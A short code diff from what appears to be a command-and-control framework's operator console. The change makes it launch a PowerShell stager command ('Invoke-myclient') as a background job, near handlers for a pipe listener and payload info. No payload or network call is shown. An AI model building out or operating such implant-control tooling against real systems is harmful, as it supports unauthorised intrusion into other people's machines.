@@ -825,7 +825,7 @@ class mymainclass():
                     else:
                         print("Payload already loaded")
                     
-                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-myclient")
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                     continue
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
@@ -909,6 +909,7 @@ class mymainclass():
                 if command_id == self.__t_myconstant.CMD_BACK:
                     cmd_tag = self.__t_myconstant.TAG_MYCS
                     continue
+
                 if command_id == self.__t_myconstant.CMD_PAYLOAD_INFO:
                     self.__t_mypayload.printinfo()
                     continue
